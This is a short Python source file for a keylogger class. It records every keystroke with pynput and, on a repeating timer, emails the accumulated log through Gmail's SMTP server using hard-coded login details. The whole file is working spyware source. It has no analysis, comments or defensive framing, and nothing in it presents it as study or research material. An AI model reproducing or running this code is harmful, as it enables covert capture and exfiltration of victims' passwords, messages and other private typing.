#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "Keylogger started"
        self.interval = interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def keypress_callback(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = str(key)
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\r\n\r\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.keypress_callback)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
